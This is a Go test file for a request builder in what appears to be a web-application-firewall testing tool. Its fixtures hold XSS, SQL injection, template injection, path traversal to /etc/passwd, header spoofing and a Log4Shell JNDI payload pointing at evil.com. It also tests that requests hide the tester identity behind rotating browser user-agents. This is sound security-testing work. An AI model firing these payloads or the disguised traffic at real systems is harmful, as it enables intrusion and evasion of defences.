package realistic

import (
	"bytes"
	"strings"
	"testing"
)

func TestBuilderBuildRequest_Query(t *testing.T) {
	builder := NewBuilder("https://example.com")

	template := &RequestTemplate{
		Method:         "GET",
		Path:           "/search",
		InjectionParam: "q",
		InjectionLoc:   LocationQuery,
		QueryParams: map[string]string{
			"page":  "1",
			"limit": "10",
		},
	}

	req, err := builder.BuildRequest("<script>alert(1)</script>", template)
	if err != nil {
		t.Fatalf("BuildRequest failed: %v", err)
	}

	// Check method
	if req.Method != "GET" {
		t.Errorf("Expected GET, got %s", req.Method)
	}

	// Check URL contains payload
	if !strings.Contains(req.URL.RawQuery, "q=") {
		t.Errorf("Query should contain injection param 'q', got: %s", req.URL.RawQuery)
	}

	// Check other params preserved
	if !strings.Contains(req.URL.RawQuery, "page=1") {
		t.Errorf("Query should contain page=1, got: %s", req.URL.RawQuery)
	}

	// Check User-Agent is realistic (not WAF-Tester)
	ua := req.Header.Get("User-Agent")
	if strings.Contains(ua, "WAF-Tester") {
		t.Errorf("User-Agent should not contain WAF-Tester, got: %s", ua)
	}
	if !strings.Contains(ua, "Mozilla") {
		t.Errorf("User-Agent should look like browser, got: %s", ua)
	}
}

func TestBuilderBuildRequest_FormBody(t *testing.T) {
	builder := NewBuilder("https://example.com")

	template := &RequestTemplate{
		Method:         "POST",
		Path:           "/login",
		InjectionParam: "username",
		InjectionLoc:   LocationBody,
		FormData: map[string]string{
			"password": "test123",
			"remember": "true",
		},
	}

	req, err := builder.BuildRequest("' OR 1=1 --", template)
	if err != nil {
		t.Fatalf("BuildRequest failed: %v", err)
	}

	// Check method
	if req.Method != "POST" {
		t.Errorf("Expected POST, got %s", req.Method)
	}

	// Check Content-Type
	ct := req.Header.Get("Content-Type")
	if ct != "application/x-www-form-urlencoded" {
		t.Errorf("Expected form content type, got: %s", ct)
	}

	// Read body
	buf := new(bytes.Buffer)
	buf.ReadFrom(req.Body)
	body := buf.String()

	// Check payload is in body
	if !strings.Contains(body, "username=") {
		t.Errorf("Body should contain username param, got: %s", body)
	}

	// Check other params preserved
	if !strings.Contains(body, "password=test123") {
		t.Errorf("Body should contain password, got: %s", body)
	}
}

func TestBuilderBuildRequest_JSON(t *testing.T) {
	builder := NewBuilder("https://api.example.com")

	template := &RequestTemplate{
		Method:         "POST",
		Path:           "/api/v1/data",
		InjectionField: "query",
		InjectionLoc:   LocationJSON,
		JSONData: map[string]interface{}{
			"version": "1.0",
			"action":  "search",
		},
	}

	req, err := builder.BuildRequest("${jndi:ldap://evil.com/x}", template)
	if err != nil {
		t.Fatalf("BuildRequest failed: %v", err)
	}

	// Check Content-Type
	ct := req.Header.Get("Content-Type")
	if ct != "application/json" {
		t.Errorf("Expected JSON content type, got: %s", ct)
	}

	// Read body
	buf := new(bytes.Buffer)
	buf.ReadFrom(req.Body)
	body := buf.String()

	// Check JSON structure
	if !strings.Contains(body, `"query"`) {
		t.Errorf("Body should contain query field, got: %s", body)
	}
	if !strings.Contains(body, `"version":"1.0"`) {
		t.Errorf("Body should contain version field, got: %s", body)
	}
}

func TestBuilderBuildRequest_Cookie(t *testing.T) {
	builder := NewBuilder("https://example.com")

	template := &RequestTemplate{
		Method:         "GET",
		Path:           "/dashboard",
		InjectionParam: "session",
		InjectionLoc:   LocationCookie,
		Cookies: map[string]string{
			"tracking": "abc123",
		},
	}

	req, err := builder.BuildRequest("admin' OR '1'='1", template)
	if err != nil {
		t.Fatalf("BuildRequest failed: %v", err)
	}

	// Check cookies
	cookies := req.Cookies()
	if len(cookies) < 2 {
		t.Errorf("Expected at least 2 cookies, got %d", len(cookies))
	}

	foundSession := false
	foundTracking := false
	for _, c := range cookies {
		if c.Name == "session" {
			foundSession = true
		}
		if c.Name == "tracking" && c.Value == "abc123" {
			foundTracking = true
		}
	}

	if !foundSession {
		t.Error("Expected session cookie with payload")
	}
	if !foundTracking {
		t.Error("Expected tracking cookie preserved")
	}
}

func TestBuilderBuildRequest_Header(t *testing.T) {
	builder := NewBuilder("https://example.com")

	template := &RequestTemplate{
		Method:         "GET",
		Path:           "/api",
		InjectionParam: "X-Custom-Header",
		InjectionLoc:   LocationHeader,
	}

	payload := "{{constructor.constructor('return this')()}}"
	req, err := builder.BuildRequest(payload, template)
	if err != nil {
		t.Fatalf("BuildRequest failed: %v", err)
	}

	// Check custom header
	headerVal := req.Header.Get("X-Custom-Header")
	if headerVal != payload {
		t.Errorf("Expected payload in header, got: %s", headerVal)
	}
}

func TestBuilderBuildRequest_XForwarded(t *testing.T) {
	builder := NewBuilder("https://example.com")

	template := &RequestTemplate{
		Method:       "GET",
		Path:         "/admin",
		InjectionLoc: LocationXForwarded,
	}

	payload := "127.0.0.1, 192.168.1.1"
	req, err := builder.BuildRequest(payload, template)
	if err != nil {
		t.Fatalf("BuildRequest failed: %v", err)
	}

	// Check X-Forwarded-For
	xff := req.Header.Get("X-Forwarded-For")
	if xff != payload {
		t.Errorf("Expected payload in X-Forwarded-For, got: %s", xff)
	}

	// Check X-Real-IP
	xri := req.Header.Get("X-Real-IP")
	if xri != payload {
		t.Errorf("Expected payload in X-Real-IP, got: %s", xri)
	}
}

func TestBuilderBuildRequest_Path(t *testing.T) {
	builder := NewBuilder("https://example.com")

	template := &RequestTemplate{
		Method:       "GET",
		Path:         "/files/{payload}",
		InjectionLoc: LocationPath,
	}

	payload := "../../../etc/passwd"
	req, err := builder.BuildRequest(payload, template)
	if err != nil {
		t.Fatalf("BuildRequest failed: %v", err)
	}

	// Check path contains encoded payload
	if !strings.Contains(req.URL.Path, "etc") {
		t.Errorf("Path should contain payload, got: %s", req.URL.Path)
	}
}

func TestBuilderRealisticHeaders(t *testing.T) {
	builder := NewBuilder("https://example.com")
	builder.RandomizeUA = true

	req, err := builder.BuildRequest("test", nil)
	if err != nil {
		t.Fatalf("BuildRequest failed: %v", err)
	}

	// Check essential headers present
	requiredHeaders := []string{
		"User-Agent",
		"Accept",
		"Accept-Language",
		"Accept-Encoding",
		"Connection",
	}

	for _, h := range requiredHeaders {
		if req.Header.Get(h) == "" {
			t.Errorf("Missing required header: %s", h)
		}
	}

	// User-Agent should look realistic
	ua := req.Header.Get("User-Agent")
	if !strings.Contains(ua, "Mozilla") && !strings.Contains(ua, "Chrome") && !strings.Contains(ua, "Firefox") {
		t.Errorf("User-Agent doesn't look realistic: %s", ua)
	}
}

func TestDefaultTemplates(t *testing.T) {
	tests := []struct {
		name     string
		template *RequestTemplate
		wantPath string
	}{
		{
			name:     "SearchTemplate",
			template: SearchTemplate(),
			wantPath: "/search",
		},
		{
			name:     "LoginTemplate",
			template: LoginTemplate(),
			wantPath: "/login",
		},
		{
			name:     "FormTemplate",
			template: FormTemplate("/submit"),
			wantPath: "/submit",
		},
		{
			name:     "APITemplate",
			template: APITemplate("/api/v1/users", "POST"),
			wantPath: "/api/v1/users",
		},
	}

	builder := NewBuilder("https://example.com")

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req, err := builder.BuildRequest("test_payload", tt.template)
			if err != nil {
				t.Fatalf("BuildRequest failed: %v", err)
			}

			if req.URL.Path != tt.wantPath {
				t.Errorf("Expected path %s, got %s", tt.wantPath, req.URL.Path)
			}
		})
	}
}

func TestRandomUserAgent(t *testing.T) {
	builder := NewBuilder("https://example.com")
	builder.RandomizeUA = true

	// Generate multiple requests and check UAs vary
	uas := make(map[string]bool)
	for i := 0; i < 20; i++ {
		req, _ := builder.BuildRequest("test", nil)
		uas[req.Header.Get("User-Agent")] = true
	}

	// With 10 default UAs and 20 requests, we should see some variety
	if len(uas) < 2 {
		t.Error("Expected User-Agent rotation, but got same UA every time")
	}
}

func TestLocationConstants(t *testing.T) {
	// Verify all locations are properly defined
	locations := []InjectionLocation{
		LocationQuery,
		LocationPath,
		LocationBody,
		LocationJSON,
		LocationHeader,
		LocationCookie,
		LocationUserAgent,
		LocationReferer,
		LocationXForwarded,
		LocationFragment,
		LocationMultipart,
	}

	for _, loc := range locations {
		if string(loc) == "" {
			t.Errorf("Location constant is empty")
		}
	}
}

func TestCloneRequest(t *testing.T) {
	builder := NewBuilder("https://example.com")

	original, _ := builder.BuildRequest("test", &RequestTemplate{
		Method: "POST",
		Path:   "/api",
		FormData: map[string]string{
			"data": "value",
		},
		InjectionLoc: LocationBody,
	})

	clone, err := CloneRequest(original)
	if err != nil {
		t.Fatalf("CloneRequest failed: %v", err)
	}

	// Verify clone is independent
	if clone.URL.String() != original.URL.String() {
		t.Error("Clone URL doesn't match original")
	}

	// Modify clone and verify original unchanged
	clone.Header.Set("X-Test", "modified")
	if original.Header.Get("X-Test") == "modified" {
		t.Error("Modifying clone affected original")
	}
}
